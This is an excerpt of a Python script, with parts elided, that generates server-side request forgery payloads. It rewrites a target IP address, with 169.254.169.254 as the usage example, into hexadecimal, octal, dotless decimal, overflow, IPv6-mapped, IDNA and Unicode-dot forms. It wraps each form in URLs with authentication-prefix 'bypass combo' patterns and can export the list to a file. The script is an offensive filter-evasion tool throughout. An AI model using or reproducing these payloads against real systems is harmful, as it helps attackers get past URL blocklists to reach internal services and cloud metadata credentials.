...
def convertIP2RandomUnicodeValue():
    ...
    for x in range(0, 4):
        if len(IPAddressParts4EnclosedAlphanumerics[x]) == 3 and (
                int(IPAddressParts4EnclosedAlphanumerics[x][0] + IPAddressParts4EnclosedAlphanumerics[x][
                    1])) <= 20 and (int(
            IPAddressParts4EnclosedAlphanumerics[x][0] + IPAddressParts4EnclosedAlphanumerics[x][1] +
            IPAddressParts4EnclosedAlphanumerics[x][2])) >= 10:
...
def PrintAndWrite(IPAddress):
    ...
    if EXPORTRESULTS == 'export':
        ...
        print('http://', IPAddress, ':', PORT, '+&@', RANDOMPREFIXVALIDSITE, '#+@', RANDOMPREFIXVALIDSITE, '/', file=f,
              sep='')
        print('http://', RANDOMPREFIXVALIDSITE, '+&@', IPAddress, ':', PORT, '#+@', RANDOMPREFIXVALIDSITE, '/', file=f,
              sep='')
        print('http://', RANDOMPREFIXVALIDSITE, '+&@', RANDOMPREFIXVALIDSITE, '#+@', IPAddress, ':', PORT, '/', file=f,
              sep='')
...
if validIP(arg1) == False:
    print("\n", yellowcolor, arg1, resetcolor, redcolor,
          " is not a valid IPv4 address in dotted decimal format, example: 123.123.123.123", resetcolor, sep='')
    print("\nUsage: python " + sys.argv[0] + " IP EXPORT(optional)\nUsage: python " + sys.argv[
        0] + " 169.254.169.254\nUsage: python " + sys.argv[0] + " 169.254.169.254 export")
    exit(1)
...
print("\n", sep='')
print(bluecolor, "Dotted hexadecimal IP Address of:", resetcolor, yellowcolor, " http://", arg1, resetcolor, bluecolor,
      " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
IP1 = HEX_SINGLE(ipFrag3, "yes") + "." + HEX_SINGLE(ipFrag2, "yes") + "." + HEX_SINGLE(ipFrag1,
                                                                                       "yes") + "." + HEX_SINGLE(
    ipFrag0, "yes")
PrintAndWrite(IP1)

# Case 2 - Dotless hexadecimal
print(bluecolor, "Dotless hexadecimal IP Address of:", resetcolor, yellowcolor, " http://", arg1, resetcolor, bluecolor,
      " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Dotless decimal IP Address of:", resetcolor, yellowcolor, " http://", arg1, resetcolor, bluecolor,
      " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
IP3 = str(
    DECIMAL_SINGLE(ipFrag3, 3) + DECIMAL_SINGLE(ipFrag2, 2) + DECIMAL_SINGLE(ipFrag1, 1) + DECIMAL_SINGLE(ipFrag0, 0))
PrintAndWrite(IP3)

# Case 4 - Dotted decimal with overflow(256)
print(bluecolor, "Dotted decimal with overflow(256) IP Address of:", resetcolor, yellowcolor, " http://", arg1,
      resetcolor, bluecolor, " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
# Case 5 - Dotted octal
print(bluecolor, "Dotted octal IP Address of:", resetcolor, yellowcolor, " http://", arg1, resetcolor, bluecolor,
      " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Dotted octal with padding IP Address of:", resetcolor, yellowcolor, " http://", arg1, resetcolor,
      bluecolor, " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "IPv6 compact version IP Address of:", resetcolor, yellowcolor, " http://", arg1, resetcolor,
      bluecolor, " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "IPv6 compact version with % bypass IP Address of:", resetcolor, yellowcolor, " http://", arg1,
      resetcolor, bluecolor, " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "IPv6 mapped version IP Address of:", resetcolor, yellowcolor, " http://", arg1, resetcolor, bluecolor,
      " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "IPv6 mapped version with % bypass IP Address of:", resetcolor, yellowcolor, " http://", arg1,
      resetcolor, bluecolor, " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Dotted hexadecimal + Dotted octal + Dotless decimal IP Address of:", resetcolor, yellowcolor,
      " http://", arg1, resetcolor, bluecolor, " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Dotted hexadecimal + Dotless decimal IP Address of:", resetcolor, yellowcolor, " http://", arg1,
      resetcolor, bluecolor, " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Dotted octal with padding + Dotless decimal IP Address of:", resetcolor, yellowcolor, " http://",
      arg1, resetcolor, bluecolor, " + authentication prefix/bypass combo list", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Dotted octal with padding + Dotted hexadecimal + Dotless decimal IP Address of:", resetcolor,
      yellowcolor, " http://", arg1, resetcolor, bluecolor, " + authentication prefix/bypass combo list", resetcolor,
      sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Abusing IDNA Standard: ", resetcolor, yellowcolor, "http://ß.localdomain.pw/", resetcolor, ' -> ',
      yellowcolor, 'http://cc.localdomain.pw/', resetcolor, ' => ', bluecolor, 'DNS', resetcolor, ' => ', yellowcolor,
      '127.127.127.127', resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Abusing 。and ｡ and ．: ", resetcolor, yellowcolor, "http://", IPAddressParts[0], "。",
      IPAddressParts[1], "。", IPAddressParts[2], "。", IPAddressParts[3], "/", resetcolor, " and ", yellowcolor,
      "http://", IPAddressParts[0], "｡", IPAddressParts[1], "｡", IPAddressParts[2], "｡", IPAddressParts[3], "/",
      resetcolor, " and ", yellowcolor, "http://", IPAddressParts[0], "．", IPAddressParts[1], "．", IPAddressParts[2],
      "．", IPAddressParts[3], "/", resetcolor, ' -> ', yellowcolor, "http://", IPAddressParts[0], ".",
      IPAddressParts[1], ".", IPAddressParts[2], ".", IPAddressParts[3], "/", resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
...
print(bluecolor, "Abusing Unicode:", resetcolor, " ", yellowcolor, 'http://', convertIP2RandomUnicodeValue(),
      resetcolor, '        -> ', yellowcolor, "http://", arg1, resetcolor, sep='')
print(greencolor,
      '=========================================================================================================================================',
      resetcolor, sep='')
